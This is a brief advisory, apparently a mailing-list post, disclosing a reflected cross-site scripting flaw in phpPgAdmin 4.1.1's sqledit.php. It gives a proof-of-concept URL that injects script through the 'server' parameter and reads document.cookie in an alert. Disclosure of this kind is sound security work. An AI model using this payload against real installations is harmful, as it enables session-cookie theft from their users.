Subject: phpPgAdmin XSS Vulnerability

There is a JavaScript code Injection in phpPgAdmin which fails to correctly
sanitize user supplied data. As a result very simple XSS is possible. This
was tested on phpPgAdmin 4.1.1 as not logged user.
PoC:
https://test.com/phpPgAdmin/sqledit.php?server=%3A5432%3Aallow');alert(document.cookie);alert('phpPgAdmin%204.1.1%20XSS%20Vulnerability');//
